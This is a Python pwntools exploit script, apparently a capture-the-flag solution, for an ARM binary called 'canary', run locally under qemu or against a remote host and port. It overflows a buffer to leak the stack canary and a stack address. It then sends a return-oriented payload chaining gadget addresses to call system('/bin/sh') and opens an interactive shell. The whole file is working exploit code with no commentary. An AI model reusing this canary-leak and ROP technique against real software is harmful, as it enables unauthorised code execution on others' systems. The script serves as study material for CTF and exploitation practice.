#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('qemu-arm-static ./canary', shell=True)
else:
    s = remote('116.203.30.62', 18113)

elf = ELF('./canary')

magick1 = 0x522e8
magick2 = 0x10d40
magick3 = 0x10160

s.sendafter('> ', 'A' * 41)
s.recvuntil('A' * 41)
canary = u32(s.recv(3).rjust(4, '\0'))
log.info('canary: %#x' % canary)

s.sendafter('> ', 'A' * 48)
s.recvuntil('A' * 48)
stack_addr = u32(s.recv(4)) - 0x54
log.info('stack address: %#x' % stack_addr)

payload = ''
payload += 'A' * 4
payload = payload.ljust(40, 'A')
payload += p32(canary)
payload += 'A' * 0xc
payload += p32(magick1)
payload += p32(0) * 2
payload += p32(elf.search('/bin/sh').next())
payload += p32(0) * 2
payload += p32(magick3)
payload += p32(elf.symbols['system'])
payload += p32(magick2)
s.sendafter('> ', payload)
time.sleep(0.1)
s.sendlineafter('> ', '')
s.interactive()
